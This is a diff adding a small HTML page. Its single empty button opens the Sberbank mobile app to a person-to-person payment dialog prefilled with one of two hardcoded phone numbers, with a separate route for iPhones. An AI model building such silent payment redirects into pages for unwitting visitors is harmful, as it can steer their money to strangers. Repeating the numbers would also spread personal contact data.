@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <button id="relocate"></button>
+</body>
+<script>
+    let relocate = document.getElementById('relocate')
+    relocate.addEventListener('click',()=>{
+        navigator.userAgent.includes("iPhone") ? 
+        (window.location.href="sbolonline://payments?p2p-by-phone-number",setTimeout((()=>window.location.href="sberbankonline://payments/p2p-by-phone-number/+79284830355"),100))
+        :
+        window.location.href="sberbankonline://messenger/dialog-for-phone?phone=+79889368516&tab=payments"
+    })
+</script>
+</html>
